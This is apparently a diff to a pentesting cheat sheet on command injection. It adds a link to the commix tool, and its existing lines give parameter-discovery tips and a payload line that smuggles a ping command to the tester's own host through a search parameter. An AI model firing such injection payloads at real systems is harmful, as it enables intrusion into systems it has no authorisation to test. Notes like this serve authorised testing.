@@ -3,6 +3,9 @@
 ## Tips
 - bruteforce for php file or anything else, after that use paraminer or arjun or paramspider
 
+## Tools
+- [commix](https://github.com/commixproject/commix)
+
 ## Payload
 - /?search=%00{.exec|ping <MyIP>
 
